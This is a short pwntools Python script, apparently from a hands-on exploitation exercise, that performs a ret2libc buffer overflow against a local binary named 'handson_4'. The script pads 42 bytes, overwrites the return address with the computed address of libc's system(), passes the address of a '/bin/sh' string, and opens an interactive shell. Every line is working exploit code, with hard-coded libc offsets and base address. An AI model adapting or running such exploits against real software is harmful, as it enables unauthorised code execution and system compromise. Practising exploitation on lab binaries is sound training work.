from pwn import *

target = process("./handson_4")

libc_binsh_off = 0x17bb8f
libc_system_off = 0x3cd80
libc_base_addr = 0xf7dd9000

libc_system_addr = libc_base_addr + libc_system_off
libc_binsh_addr = libc_base_addr + libc_binsh_off

print("system : 0x{:x}".format(libc_system_addr))
print("/bin/sh : 0x{:x}".format(libc_binsh_addr))

payload = b"A" * 42
payload += p32(libc_system_addr)
payload += b"BBBB"
payload += p32(libc_binsh_addr)

target.sendline(payload)

target.interactive()
